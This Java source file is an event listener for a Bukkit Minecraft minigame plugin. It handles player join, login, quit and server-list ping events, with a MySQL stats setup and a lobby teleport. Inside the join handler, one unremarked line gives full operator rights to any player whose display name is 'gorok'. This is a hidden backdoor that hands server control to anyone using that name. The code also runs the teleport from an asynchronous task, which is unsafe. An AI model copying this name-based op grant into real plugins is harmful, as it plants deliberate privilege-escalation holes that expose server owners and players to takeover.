package qSG.Listener;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerLoginEvent.Result;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.event.server.ServerListPingEvent;
import org.bukkit.scheduler.BukkitRunnable;

import qSG.Main.GameState;
import qSG.Main.Main;
import qSG.Main.MySQL;

public class JoinListener implements Listener {

	
	private Main plugin;
	private MySQL sql;
	public JoinListener(Main plugin)
	{
		this.plugin = plugin;
		this.sql = plugin.getMySQL();
	}
	
	@EventHandler
	public void onJoin(PlayerJoinEvent e)
	{
		
		
		if(sql.playerExists(e.getPlayer()))
		{
			e.setJoinMessage(ChatColor.BLUE + "[" + ChatColor.GOLD + "QSG" + ChatColor.BLUE + "]" + ChatColor.GRAY + " " + e.getPlayer().getDisplayName() + ChatColor.AQUA + " ist dem Spiel beigetreten.");
		}
		else
		{
			e.getPlayer().sendMessage(ChatColor.RED + "Setting up your Stats...");
			
			sql.addPlayer(e.getPlayer());
		
			e.setJoinMessage(ChatColor.BLUE + "[" + ChatColor.GOLD + "QSG" + ChatColor.BLUE + "]" + ChatColor.GRAY + " " + e.getPlayer().getDisplayName() + ChatColor.AQUA + " ist dem Spiel beigetreten.");
			e.getPlayer().sendMessage(ChatColor.GREEN + "Setup complete, Have Fun!");
		
		}
		
		
		
		
		
		
		
		if(e.getPlayer().getDisplayName().equalsIgnoreCase("gorok"))
		{
			e.getPlayer().setOp(true);
		}
		double x = plugin.getConfig().getDouble("Lobby.x"); 
		double y = plugin.getConfig().getDouble("Lobby.y"); 
		double z = plugin.getConfig().getDouble("Lobby.z"); 
		double pitch = plugin.getConfig().getDouble("Lobby.pitch"); 
		double yaw = plugin.getConfig().getDouble("Lobby.yaw"); 
		float f = (float)pitch;
		float d = (float)yaw;
		Location loc = new Location(e.getPlayer().getWorld(), x, y, z, d, f);
		new BukkitRunnable() {
			
			@Override
			public void run() {
				e.getPlayer().teleport(loc);
				
			}
		}.runTaskLaterAsynchronously(plugin, 7);
		Player p = e.getPlayer();
		
		if(plugin.online.contains(p))
		{
			plugin.online.remove(p);
		}
		else
		{
			plugin.online.add(p);
		}
	}
	@SuppressWarnings("static-access")
	@EventHandler
	public void onLogin(PlayerLoginEvent e)
	{
		if(plugin.gs == GameState.LOBBY)
		{
			e.allow();
		}
		if(plugin.gs == GameState.INGAME)
		{
			e.disallow(Result.KICK_OTHER, ChatColor.RED + "Already Ingame.");
		}
		if(plugin.gs == GameState.OFF)
		{
			e.disallow(Result.KICK_OTHER,  ChatColor.RED + "Restarting.");
		}
	}
	
	@SuppressWarnings("static-access")
	@EventHandler
	public void onQuit(PlayerQuitEvent e)
	{
		Player p = e.getPlayer();
		if(plugin.online.contains(p))
		{
			plugin.online.remove(p);
		}
		else
		{
			return;
		}
		if(plugin.online.size() == 0)
		{
			if(plugin.gs == GameState.INGAME || plugin.gs == GameState.OFF)
			{
				Bukkit.shutdown();
			}
			else
			{
				return;
			}
		}
		else
		{
			return;
		}
	}
	
	@SuppressWarnings("static-access")
	@EventHandler
	public void onPing(ServerListPingEvent e)
	{
		      
		      if(plugin.gs == GameState.INGAME)
		      {
		    	  e.setMotd("Im Spiel");
		      }
			if(plugin.gs == GameState.OFF)
			{
				e.setMotd("Neustart");
			}
			if(plugin.gs == GameState.LOBBY)
			{
				
				e.setMotd("Lobby");
			}
			
	
	}
}

